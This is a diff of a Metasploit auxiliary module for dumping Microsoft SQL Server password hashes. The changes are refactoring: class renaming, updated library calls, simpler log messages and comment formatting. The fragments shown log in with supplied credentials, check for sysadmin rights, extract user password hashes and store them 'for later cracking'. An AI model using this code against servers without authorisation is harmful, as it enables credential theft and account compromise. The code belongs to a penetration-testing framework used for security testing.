@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL
   include Msf::Auxiliary::Report
 
@@ -30,8 +25,8 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
 
-    if (not mssql_login_datastore)
-      print_error("#{rhost}:#{rport} - Invalid SQL Server credentials")
+    if !mssql_login_datastore
+      print_error("Invalid SQL Server credentials")
       return
     end
 
@@ -74,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 
     create_credential_login(login_data)
 
-    #Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
+    # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
     instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
     print_status("Instance Name: #{instancename.inspect}")
     version = mssql_query(mssql_sql_info())[:rows][0][0]
@@ -89,8 +84,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
-  #Stores the grabbed hashes as loot for later cracking
-  #The hash format is slightly different between 2k and 2k5/2k8
+  # Stores the grabbed hashes as loot for later cracking
+  # The hash format is slightly different between 2k and 2k5/2k8
   def report_hashes(mssql_hashes, version_year)
 
     case version_year
@@ -110,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
           :proto => 'tcp'
           )
 
-    tbl = Rex::Ui::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => 'MS SQL Server Hashes',
       'Indent'   => 1,
       'Columns' => ['Username', 'Hash']
@@ -150,17 +145,17 @@ class Metasploit3 < Msf::Auxiliary
       login = create_credential_login(login_data)
 
       tbl << [row[0], row[1]]
-      print_good("#{rhost}:#{rport} - Saving #{hashtype} = #{row[0]}:#{row[1]}")
+      print_good("Saving #{hashtype} = #{row[0]}:#{row[1]}")
     end
   end
 
-  #Grabs the user tables depending on what Version of MSSQL
-  #The queries are different between 2k and 2k/2k8
+  # Grabs the user tables depending on what Version of MSSQL
+  # The queries are different between 2k and 2k/2k8
   def mssql_hashdump(version_year)
     is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
 
     if is_sysadmin == 0
-      print_error("#{rhost}:#{rport} - The provided credentials do not have privileges to read the password hashes")
+      print_error("The provided credentials do not have privileges to read the password hashes")
       return nil
     end
 
